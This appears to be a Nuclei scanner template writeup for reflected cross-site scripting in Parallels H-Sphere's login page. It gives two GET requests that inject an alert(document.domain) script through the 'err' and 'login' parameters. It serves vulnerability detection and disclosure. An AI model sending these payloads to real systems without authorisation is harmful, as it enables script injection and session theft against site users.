# Nuclei Template: Parallels H-Sphere - Cross-Site Scripting
**Template ID:** parallels-hsphere-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`parallels-hsphere-xss.yaml`)

## Vulnerability Information & PoC

## Description
Parallels H-Sphere contains multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data. An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
GET {{BaseURL}}/webshell4/login.php?login=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://www.exploit-db.com/exploits/32396
